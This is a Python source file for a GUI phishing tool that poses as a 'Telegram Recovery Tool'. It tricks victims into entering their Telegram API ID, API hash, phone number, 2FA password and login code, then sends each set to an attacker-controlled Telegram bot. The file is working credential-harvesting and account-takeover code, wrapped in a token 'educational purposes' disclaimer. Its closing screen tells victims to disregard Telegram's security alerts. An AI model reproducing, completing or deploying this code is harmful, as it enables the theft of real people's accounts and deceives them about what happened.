import customtkinter
import requests
import threading
import time

# ============================================================================
# Telegram Credential Harvester - GUI Edition
#
# Created by: ZeroEthical
# Purpose: This tool is for educational purposes to demonstrate social
#          engineering attacks. It collects Telegram API credentials.
#          Unauthorized access to computer systems is illegal.
# ============================================================================


# --- TELEGRAM BOT CONFIGURATION (TO BE REPLACED BY `configure.py`) ---
# These placeholders are meant to be replaced by the configuration script.
# Do not run this file directly unless you have manually replaced them.
BOT_TOKEN = "PON_AQUÍ_EL_TOKEN_DE_TU_BOT"
ATTACKER_CHAT_ID = "PON_AQUÍ_TU_CHAT_ID"

TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"


# --- DATA EXFILTRATION LOGIC ---

def send_stolen_creds_phase1_to_bot(api_id, api_hash, phone_number, twofa_password):
    """
    Sends the initial credentials (Phase 1) to the attacker's bot.
    This function is designed to run in a separate thread to avoid freezing the GUI.
    """
    message_text = (
        "✅ **Phase 1 Credentials Received** ✅\n\n"
        f"**API ID:** `{api_id}`\n"
        f"**API Hash:** `{api_hash}`\n"
        f"**Phone Number:** `{phone_number}`\n"
        f"**2FA Password:** `{twofa_password if twofa_password else 'Not provided'}`\n\n"
        "**ACTION REQUIRED:** Use these credentials in your Telethon script now to trigger the login code."
    )
    payload = {
        'chat_id': ATTACKER_CHAT_ID,
        'text': message_text,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
    except requests.exceptions.RequestException as e:
        # Log error silently or handle as needed
        print(f"Error sending Phase 1 data: {e}")

def send_stolen_code_phase2_to_bot(phone_number, login_code):
    """
    Sends the stolen login code (Phase 2) to the attacker's bot.
    Runs in a separate thread.
    """
    message_text = (
        "🎯 **Phase 2 Login Code Received** 🎯\n\n"
        f"**Phone Number:** `{phone_number}`\n"
        f"**LOGIN CODE:** `{login_code}`\n\n"
        "**ACTION REQUIRED:** Use this code immediately to complete the login!"
    )
    payload = {
        'chat_id': ATTACKER_CHAT_ID,
        'text': message_text,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Error sending Phase 2 data: {e}")


# --- GUI APPLICATION ---

class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        # --- Window Setup ---
        self.title("Telegram Recovery Tool")
        self.geometry("400x500")
        self.resizable(False, False)
        customtkinter.set_appearance_mode("dark")

        # --- State Variables ---
        self.phone_number = ""

        # --- Initial UI Setup ---
        self.setup_phase1_ui()

    def clear_frame(self):
        """Clears all widgets from the main window."""
        for widget in self.winfo_children():
            widget.destroy()

    def setup_phase1_ui(self):
        """Creates the UI for collecting initial credentials."""
        self.clear_frame()

        main_frame = customtkinter.CTkFrame(self)
        main_frame.pack(pady=20, padx=20, fill="both", expand=True)

        title_label = customtkinter.CTkLabel(main_frame, text="Account Recovery", font=customtkinter.CTkFont(size=20, weight="bold"))
        title_label.pack(pady=12, padx=10)

        description_label = customtkinter.CTkLabel(main_frame, text="Please enter your API credentials to begin the recovery process. You can find these at my.telegram.org.", wraplength=300)
        description_label.pack(pady=10)

        self.api_id_entry = customtkinter.CTkEntry(main_frame, placeholder_text="API ID")
        self.api_id_entry.pack(pady=12, padx=10, fill="x")

        self.api_hash_entry = customtkinter.CTkEntry(main_frame, placeholder_text="API Hash")
        self.api_hash_entry.pack(pady=12, padx=10, fill="x")

        self.phone_entry = customtkinter.CTkEntry(main_frame, placeholder_text="Phone Number (+123456789)")
        self.phone_entry.pack(pady=12, padx=10, fill="x")

        self.twofa_entry = customtkinter.CTkEntry(main_frame, placeholder_text="2FA Password (if any)", show="*")
        self.twofa_entry.pack(pady=12, padx=10, fill="x")

        self.submit_button_p1 = customtkinter.CTkButton(main_frame, text="Connect to Telegram", command=self.submit_phase1_callback)
        self.submit_button_p1.pack(pady=20, padx=10)

        self.status_label_p1 = customtkinter.CTkLabel(main_frame, text="")
        self.status_label_p1.pack(pady=5)

    def submit_phase1_callback(self):
        """Handles the submission of Phase 1 credentials."""
        api_id = self.api_id_entry.get().strip()
        api_hash = self.api_hash_entry.get().strip()
        phone = self.phone_entry.get().strip()
        twofa = self.twofa_entry.get().strip()

        if not api_id or not api_hash or not phone:
            self.status_label_p1.configure(text="Error: API ID, Hash, and Phone are required.", text_color="red")
            return

        self.phone_number = phone  # Store for Phase 2
        self.submit_button_p1.configure(state="disabled", text="Connecting...")

        # Run network request in a separate thread
        threading.Thread(target=send_stolen_creds_phase1_to_bot, args=(api_id, api_hash, phone, twofa)).start()

        # Simulate processing time before transitioning to Phase 2
        self.status_label_p1.configure(text="Validating credentials...", text_color="gray")
        self.after(2000, lambda: self.status_label_p1.configure(text="Synchronizing with API..."))
        self.after(4000, self.setup_phase2_ui)

    def setup_phase2_ui(self):
        """Creates the UI for collecting the login code."""
        self.clear_frame()

        main_frame = customtkinter.CTkFrame(self)
        main_frame.pack(pady=20, padx=20, fill="both", expand=True)

        title_label = customtkinter.CTkLabel(main_frame, text="Final Verification", font=customtkinter.CTkFont(size=20, weight="bold"))
        title_label.pack(pady=12, padx=10)

        description_label = customtkinter.CTkLabel(main_frame, text="A login code has been sent to your official Telegram app. Please enter the 5-digit code below to complete the process.", wraplength=300)
        description_label.pack(pady=10)

        self.login_code_entry = customtkinter.CTkEntry(main_frame, placeholder_text="5-Digit Code", width=200)
        self.login_code_entry.pack(pady=20, padx=10)

        self.submit_button_p2 = customtkinter.CTkButton(main_frame, text="Verify Code", command=self.submit_phase2_callback)
        self.submit_button_p2.pack(pady=20, padx=10)

        self.status_label_p2 = customtkinter.CTkLabel(main_frame, text="")
        self.status_label_p2.pack(pady=5)

    def submit_phase2_callback(self):
        """Handles the submission of the Phase 2 login code."""
        login_code = self.login_code_entry.get().strip()

        if not login_code.isdigit() or len(login_code) != 5:
            self.status_label_p2.configure(text="Error: Please enter a valid 5-digit code.", text_color="red")
            return

        self.submit_button_p2.configure(state="disabled", text="Verifying...")

        # Run network request in a separate thread
        threading.Thread(target=send_stolen_code_phase2_to_bot, args=(self.phone_number, login_code)).start()

        self.status_label_p2.configure(text="Finalizing process...", text_color="gray")
        self.after(2000, self.show_final_message)

    def show_final_message(self):
        """Displays the final confirmation message to the user."""
        self.clear_frame()

        main_frame = customtkinter.CTkFrame(self)
        main_frame.pack(pady=20, padx=20, fill="both", expand=True)

        title_label = customtkinter.CTkLabel(main_frame, text="Process Complete", font=customtkinter.CTkFont(size=20, weight="bold"))
        title_label.pack(pady=20, padx=10)

        final_text = (
            "Your request has been processed successfully.\n\n"
            "Your account status should be updated within the next 24-48 hours.\n\n"
            "You can now close this window. Any further notifications from Telegram can be disregarded as routine security alerts."
        )
        description_label = customtkinter.CTkLabel(main_frame, text=final_text, wraplength=300)
        description_label.pack(pady=10, padx=10)

        close_button = customtkinter.CTkButton(main_frame, text="Close", command=self.destroy)
        close_button.pack(pady=20)


if __name__ == "__main__":
    # Check if the configuration has been done.
    if "PON_AQUÍ" in BOT_TOKEN or "PON_AQUÍ" in ATTACKER_CHAT_ID:
        print("=====================================================================")
        print("ERROR: The script is not configured.")
        print("Please run 'configure.py' first to set your BOT_TOKEN and CHAT_ID.")
        print("=====================================================================")
        time.sleep(5)
    else:
        app = App()
        app.mainloop()
